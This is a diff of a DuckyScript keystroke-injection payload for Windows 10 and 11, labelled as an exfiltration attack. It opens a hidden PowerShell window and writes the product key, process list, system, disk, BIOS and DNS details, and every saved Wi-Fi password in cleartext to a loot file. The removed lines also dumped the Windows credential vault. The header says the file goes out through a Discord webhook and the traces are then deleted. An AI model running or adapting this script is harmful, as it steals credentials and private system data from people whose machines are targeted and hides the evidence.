@@ -8,8 +8,9 @@ REM exfiltrated using a Discord webhook. In the final stage of the payload the l
 REM contents, the temp folder contents and powershell history are all deleted. 
 REM Target: Windows 10 & 11
 REM Props: iamjakoby, HAK5 and a huge shout out to O.MG!!!
-REM Version: 2.0
+REM Version: 3.0
 REM Category: Exfiltration
+
 
 GUI r
 DELAY 200
@@ -17,95 +18,43 @@ STRING powershell -windowstyle hidden
 DELAY 200
 ENTER
 DELAY 200
-STRING Get-NetIPAddress -AddressFamily IPv4 | 
+STRING Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+STRING Get-Process | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 2000
-STRING Get-CimInstance -ClassName Win32_ComputerSystem |
+DELAY 200
+STRING Get-CimInstance -ClassName Win32_ComputerSystem | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+STRING systeminfo | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 200
+STRING Get-DnsClient | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 2000
-STRING systeminfo |
+DELAY 200
+STRING Get-ComputerInfo | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 2000
-STRING Get-DnsClient |
+DELAY 200
+STRING Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 200
+STRING Get-CimInstance -ClassName Win32_BIOS | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
-DELAY 2000
-STRING Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey |
 DELAY 200
-ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 2000
-STRING [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
-ENTER
-STRING $vault = New-Object Windows.Security.Credentials.PasswordVault
-ENTER
-STRING $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } |
-DELAY 1000
-ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 2000
-STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize |
-DELAY 2000
-ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 2000
-STRING  Get-ComputerInfo |
-DELAY 200
-ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 2000
-STRING Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |
-DELAY 200
-ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 2000
-STRING Get-CimInstance -ClassName Win32_BIOS |
-DELAY 200
-ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
-DELAY 200
-ENTER
-DELAY 2000
-STRING Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*" |
-DELAY 200
-ENTER
-DELAY 2000
-STRING Out-File C:\Users\Public\loot.txt -Force -append
+STRING Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*" | Out-File C:\Users\Public\loot.txt -Force -append
 DELAY 200
 ENTER
 DELAY 2000
